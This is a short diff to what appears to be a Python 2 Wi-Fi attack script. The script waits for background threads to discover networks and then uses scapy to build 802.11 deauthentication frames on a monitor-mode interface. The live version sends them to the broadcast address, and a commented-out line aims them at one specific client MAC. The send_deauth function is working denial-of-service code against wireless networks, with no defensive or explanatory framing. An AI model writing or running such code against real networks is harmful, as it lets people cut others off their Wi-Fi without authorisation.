@@ -30,11 +30,8 @@ thread2 = threading.Thread(target=process)
 thread2.daemon = True
 thread2.start()
 
-print "Sleeping..."
-time.sleep(10)
-
-if len(ips) == 0:
-    exit()
+while len(ips) == 0:
+    time.sleep(1)
 
 print "Found " + str(len(ips)) + " networks."
 
@@ -44,6 +41,7 @@ INTERFACE = "wlo1mon"
 
 
 def send_deauth(mac, mon):
+    # def makePacket(access_point,client="2c:0e:3d:0c:33:1a"):
     def makePacket(access_point,client="ff:ff:ff:ff:ff:ff"):
         return scapy.all.RadioTap()/scapy.all.Dot11(addr1=client, addr2=mac, addr3=mac)/scapy.all.Dot11Deauth()
     pkt = makePacket(access_point=mac)
